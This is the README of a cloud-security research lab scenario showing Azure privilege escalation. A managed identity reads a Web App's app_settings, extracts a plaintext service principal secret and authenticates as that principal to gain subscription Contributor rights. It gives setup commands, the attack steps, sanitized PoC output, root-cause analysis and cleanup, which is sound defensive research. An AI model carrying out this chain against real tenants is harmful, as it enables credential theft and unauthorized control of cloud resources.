# Z2 — Service Principal credential theft via App Service `app_settings`

## Overview

A Linux VM with a **System-Assigned Managed Identity (MI)** holds the narrowly-scoped `Website Contributor` role on a **single Azure Linux Web App**. That Web App stores a separate, elevated **Service Principal (SP)**'s `clientSecret` in plaintext as an application setting (the Azure equivalent of an AWS Lambda environment variable). The MI uses its tightly-scoped role to call `POST .../sites/{app}/config/appsettings/list`, harvests the SP's credentials, authenticates as the SP via OAuth2 `client_credentials`, and demonstrates control-plane writes — escalating from *Website Contributor on one app* to *Contributor at subscription scope*.

## Attack Flow

```
┌──────────────────────────────────────────────────────────────┐
│  VM (System-Assigned MI)                                     │
│    RBAC: Website Contributor on  app = pathtriage-z2-app-*   │
└────────┬─────────────────────────────────────────────────────┘
         │  ① IMDS  → ARM token (resource=management.azure.com)
         ▼
┌──────────────────────────────────────────────────────────────┐
│  ARM  POST .../sites/<app>/config/appsettings/list           │
│    requires Microsoft.Web/sites/config/list/Action           │
│    returns AZURE_TENANT_ID, AZURE_CLIENT_ID,                 │
│            AZURE_CLIENT_SECRET, …                            │
└────────┬─────────────────────────────────────────────────────┘
         │  ② extract SP triple
         ▼
┌──────────────────────────────────────────────────────────────┐
│  AAD  POST /<tenant>/oauth2/v2.0/token                       │
│    grant_type=client_credentials  scope=ARM/.default         │
└────────┬─────────────────────────────────────────────────────┘
         │  ③ SP ARM token
         ▼
┌──────────────────────────────────────────────────────────────┐
│  ARM  PATCH .../resourceGroups/<rg>/.../tags/default         │
│    operation=Merge — SP is Contributor at subscription scope │
└──────────────────────────────────────────────────────────────┘
```

## MITRE ATT&CK Mapping

- **T1552.001** — Unsecured Credentials: Credentials In Files (SP secret embedded in App Service `app_settings`)
- **T1078.004** — Valid Accounts: Cloud Accounts (re-authentication as the stolen SP via OAuth2 client_credentials)
- AWS analogue: **P7 — Lambda env-var theft** (same credential-in-config primitive)

## Prerequisites

- Azure baseline deployed (`environments/baseline_azure_personal/`)
- Personal Microsoft Account subscription with the operator as the sole AAD admin — required to permit `az ad sp create-for-rbac` (the UNSW Azure for Students tenant blocks this; see D-Z2-01 below)
- `~/.ssh/id_rsa.pub` present on the workstation
- `az` CLI logged in to the personal MSA subscription
- `ARM_SUBSCRIPTION_ID` / `ARM_TENANT_ID` exported (the azurerm provider's auto-detection hangs on macOS with multiple subscription contexts)

## Vulnerable Configuration

The Z2 scenario provisions three coupled misconfigurations:

1. **Foothold**: A VM with a System-Assigned MI given the `Website Contributor` role *scoped to one Web App only* (plausible "they need to deploy code" grant).
2. **Leak vector**: The same Web App stores the elevated SP's `clientSecret` in `app_settings` as `AZURE_CLIENT_SECRET`, surfacing it to anyone with `Microsoft.Web/sites/config/list/Action` on the app.
3. **Prize**: An elevated SP (pre-created via `az ad sp create-for-rbac`) holds `Contributor` at **subscription scope**.

The role chain is intentionally tight: the MI alone cannot perform anything at subscription scope; only the leaked SP can. The exploit demonstrates the pivot.

## Decision: two-subscription Azure deployment (D-Z2-01)

The UNSW Azure for Students tenant blocks Service Principal creation via Microsoft Graph (HTTP 403 `Authorization_RequestDenied`) — the same constraint that drove D-Z1-02. Z1's resolution was to model the attacker as a compromised user. Z2 cannot reuse that resolution because the **leaked credential itself** is the SP — substituting a user account would erase the catalogue semantic ("credential-in-config" class via OAuth2 SP).

Resolution: Z2 (and Z3-Z8) deploys on a **separate Azure subscription tied to a personal Microsoft Account**, where the operator is the sole AAD admin and SP creation is unrestricted. The AWS catalogue uses a single account; the Azure catalogue uses two subscriptions (UNSW Azure for Students for Z1, personal MSA for Z2-Z8) — same scenario semantics, different administrative boundary. This mirrors real-world cloud security research where institutional tenant policies frequently constrain attacker modelling.

The elevated SP is pre-created via `az ad sp create-for-rbac` (out of Terraform); its `clientId` / `secret` / `tenantId` / `objectId` are passed in via `TF_VAR_*` env vars. Terraform never touches the AAD object lifecycle.

## Implementation Note — Tag Write API Quirk

`Microsoft.Resources/tags/default` PATCH with api-version `2021-04-01` requires a top-level `operation` field (`Merge` / `Replace` / `Delete`) in addition to `properties.tags`. Omitting it returns HTTP 400 even with sufficient RBAC. The exploit uses `operation: "Merge"` so existing RG tags (`Project=PathTriage`, etc.) are preserved. This was discovered during the initial PoC verify (400 at Step 5b before the body schema fix).

## Attack Steps

1. From the workstation, establish SSH access to the VM as `azureuser` (prior foothold assumed; the lab opens 22/tcp).
2. From inside the VM, query IMDS at `169.254.169.254` with `Metadata: true` and `resource=https://management.azure.com/` to obtain an ARM-scoped Bearer token for the MI.
3. Using the MI token, issue `POST .../sites/{app}/config/appsettings/list?api-version=2022-03-01` to retrieve plaintext `app_settings`.
4. Parse `AZURE_TENANT_ID`, `AZURE_CLIENT_ID`, `AZURE_CLIENT_SECRET` from the response.
5. Re-authenticate as the elevated SP via `POST /<tenant>/oauth2/v2.0/token` with `grant_type=client_credentials` and `scope=https://management.azure.com/.default`.
6. Demonstrate subscription-scope Contributor: enumerate resources at RG scope, then issue `PATCH .../resourceGroups/<rg>/providers/Microsoft.Resources/tags/default` with `operation: Merge` to write a marker tag.

## Running the PoC

From the project root:

```bash
# 0. context check
az account show --query name -o tsv   # must be the personal MSA, not UNSW

# 1. pre-create elevated SP (out of Terraform — see D-Z2-01)
SUB_ID=$(az account show --query id -o tsv)
SP_JSON=$(az ad sp create-for-rbac \
    --name pathtriage-z2-elevated-sp \
    --role Contributor \
    --scopes "/subscriptions/$SUB_ID" \
    --years 1 -o json)
export TF_VAR_elevated_sp_client_id=$(echo "$SP_JSON" | jq -r '.appId')
export TF_VAR_elevated_sp_client_secret=$(echo "$SP_JSON" | jq -r '.password')
export TF_VAR_elevated_sp_tenant_id=$(echo "$SP_JSON" | jq -r '.tenant')
export TF_VAR_elevated_sp_object_id=$(az ad sp show \
    --id "$TF_VAR_elevated_sp_client_id" --query id -o tsv)

# 2. deploy lab
cd environments/scenarios/Z2_sp_credential_theft
terraform init && terraform apply -auto-approve

# 3. ship exploit to VM and run
terraform output -json > /tmp/z2_output.json
VM_IP=$(jq -r '.vm_public_ip.value' /tmp/z2_output.json)

scp ../../../attacks/Z2_sp_credential_theft/exploit.py \
    /tmp/z2_output.json azureuser@$VM_IP:~/

ssh azureuser@$VM_IP 'cloud-init status --wait && \
    python3 exploit.py --tf-output z2_output.json --log verification_log.txt'

scp azureuser@$VM_IP:~/verification_log.txt \
    ../../../attacks/Z2_sp_credential_theft/verification_log.txt
```

## Captured Output (PoC Verification)

The following is the captured output from running the PoC end-to-end against a freshly deployed lab on 2026-06-30. The full log is committed to this directory as `verification_log.txt` (sanitized); the raw log containing actual subscription, tenant, and SP identifiers is retained outside the repository.

```
[*] target VM:                <VM_PUBLIC_IP>
[*] foothold:                 VM System-Assigned MI with Website Contributor on one Web App
[*] target Web App:           pathtriage-z2-app-<rand>
[*] acting from the VM itself (no external attacker host required)

[*] Step 1: query IMDS for Managed Identity token (ARM-scoped)
[+] MI ARM token acquired
    token length:             2055 chars
    resource:                 https://management.azure.com/

[*] Step 2: POST .../sites/<app>/config/appsettings/list as MI
[+] retrieved 5 app_settings key(s):
    ['AZURE_CLIENT_ID', 'AZURE_CLIENT_SECRET', 'AZURE_TENANT_ID', 'ENV', 'WEBSITES_PORT']

[*] Step 3: parse plaintext SP credentials from app_settings
[+] tenant_id (elevated SP):  <TENANT_ID>
    client_id (elevated SP):  <ELEVATED_SP_CLIENT_ID>
    client_secret length:     40 chars

[*] Step 4: OAuth2 client_credentials flow to AAD as the stolen SP
[+] SP ARM token acquired
    token length:             1883 chars
    scope:                    https://management.azure.com/.default

[*] Step 5a: enumerate resources in RG as SP (Contributor proof, read)
[+] enumerated 8 resource(s) at RG scope
    resource_types:
      - Microsoft.Compute/disks
      - Microsoft.Compute/virtualMachines
      - Microsoft.Network/networkInterfaces
      - Microsoft.Network/networkSecurityGroups
      - Microsoft.Network/publicIPAddresses
      - Microsoft.Network/virtualNetworks
      - Microsoft.Web/serverFarms
      - Microsoft.Web/sites

[*] Step 5b: PATCH tag on RG as SP (Contributor proof, write)
[+] tag write succeeded
    tag:                      pathtriage-z2=owned
    api-version:              2021-04-01  (operation=Merge required)

[+] Path Z2 verified: VM MI (Website Contributor on 1 app) ->
                      app_settings credential leak ->
                      SP OAuth2 client_credentials ->
                      subscription-scope Contributor
```

## Why This Works

- Azure App Service stores `app_settings` as **environment variables surfaced to the app's runtime container**. They are persisted on the control plane and retrievable verbatim by any principal with `Microsoft.Web/sites/config/list/Action`, regardless of whether the secret was originally entered via portal, ARM template, Terraform, or DevOps pipeline. There is no Azure-side mechanism to mark a setting "write-only" once stored.
- `Website Contributor` (intended to mean "can deploy code to this app") *includes* the `list` action on the app's config — the surface that exposes secrets. Distinguishing "deploy code" from "read secrets" requires a custom role or moving secrets to Key Vault references, neither of which is the default.
- OAuth2 `client_credentials` against AAD accepts any `clientId`+`clientSecret` pair, with no IP restriction by default. Once the secret is read, the SP can be impersonated from anywhere on the public internet (here, from inside the VM; equally from the attacker's laptop). Conditional Access policies *can* restrict this but are not on by default.

## Comparison to AWS Analogue

| Dimension | AWS P7 (Lambda env-var theft) | Azure Z2 (App Service `app_settings`) |
|---|---|---|
| Leak vector | Lambda function env vars | Linux Web App `app_settings` |
| Required action | `lambda:GetFunctionConfiguration` | `Microsoft.Web/sites/config/list/Action` |
| Required role | `AWSLambda_ReadOnlyAccess` (or any role granting GetFunctionConfiguration) | `Website Contributor` (or any role granting the list action) |
| Stolen credential type | IAM access key + secret (or session) | SP `clientId` + `clientSecret` |
| Re-auth mechanism | `sts:GetCallerIdentity` / signed API calls | OAuth2 `client_credentials` to AAD |
| Token lifetime after theft | Until key rotation or session expiry (~hours) | Until SP secret rotation (~years by default) |
| Resulting scope | Whatever the leaked key holds | Whatever the SP holds (here: subscription Contributor) |

The Azure variant is **higher-impact** in two structural ways: SP secrets default to multi-year lifetimes (vs AWS access keys that mature security teams rotate), and SP scope is commonly subscription-wide (vs AWS roles often scoped to specific resources). Detection difficulty is comparable in both clouds — both leave control-plane API logs (CloudTrail / AzureActivity) for the secret read and authentication.

## Cleanup

```bash
cd environments/scenarios/Z2_sp_credential_theft
terraform destroy -auto-approve

az ad sp delete --id "$TF_VAR_elevated_sp_client_id"
az ad app delete --id "$TF_VAR_elevated_sp_client_id"

unset TF_VAR_elevated_sp_client_id TF_VAR_elevated_sp_client_secret \
      TF_VAR_elevated_sp_tenant_id TF_VAR_elevated_sp_object_id
```

Keep `baseline_azure_personal` running for Z3-Z8.

## References

- MITRE ATT&CK [T1552.001 — Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- MITRE ATT&CK [T1078.004 — Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)
- Microsoft Learn — [Web Apps Config — List Application Settings](https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/list-application-settings)
- Microsoft Learn — [Resource Tags REST API](https://learn.microsoft.com/en-us/rest/api/resources/tags/create-or-update-at-scope)
- Microsoft Learn — [Built-in role: Website Contributor](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#website-contributor)
